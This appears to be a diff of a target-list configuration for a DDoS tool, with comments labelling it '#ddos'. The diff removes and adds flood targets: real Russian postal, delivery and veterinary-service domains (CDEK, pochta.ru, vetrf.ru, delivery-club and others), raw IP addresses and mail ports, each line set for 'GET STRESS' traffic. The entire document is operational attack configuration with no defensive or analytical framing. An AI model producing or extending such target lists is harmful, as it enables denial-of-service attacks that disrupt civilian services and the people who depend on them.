@@ -3,19 +3,13 @@
 https://www.cdek.ru/ru https://cdek.by/ru/ --http-methods GET STRESS
 
 #gaidamaky
-tcp://62.76.145.83:443 tcp://62.76.145.83:80 tcp://62.76.145.85:443 tcp://62.76.145.85:80 
-tcp://62.76.145.85:8002 tcp://62.76.145.83:8443 tcp://62.76.145.96:443 tcp://62.76.145.96:80 tcp://62.76.145.99:443
+tcp://136.243.22.87:21 tcp://136.243.22.87:22 tcp://136.243.22.87:443
 
 
 
 
 #ddos separiv
-http://mercury.vetrf.ru https://ivis-sso.vetrf.ru http://assol-express.vetrf.ru --http-methods GET STRESS
-https://argus.vetrf.ru https://vetrf.ru --http-methods GET STRESS
-https://www.cdek.ru https://cdekid.cdek.ru https://tender-buy.cdek.ru/Tenders --http-methods GET STRESS
-https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru tcp://178.248.234.88:80 --http-methods GET STRESS
-https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru tcp://195.189.222.58:465 --http-methods GET STRESS
-http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ tcp://195.189.222.58:80 --http-methods GET STRESS
-http://login.izusa.cdek.ru https://fivepost.ru https://195.189.222.59:443 tcp://194.49.120.61:443 --http-methods GET STRESS
-https://194.49.120.61:443 http://195.189.222.42:80 tcp://195.189.222.62:25 --http-methods GET STRESS
-https://194.49.120.60:443 https://194.49.120.61:443 tcp://195.189.222.62:465 --http-methods GET STRESS
+https://dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com tcp://91.215.37.57:25 --http-methods GET STRESS
+https://www.pochta.ru https://podpiska.pochta.ru https://zakaznoe.pochta.ru tcp://91.215.36.57:25 --http-methods GET STRESS
+https://otpravka.pochta.ru http://128.140.175.200:80 https://128.140.175.200:443 --http-methods GET STRESS
+
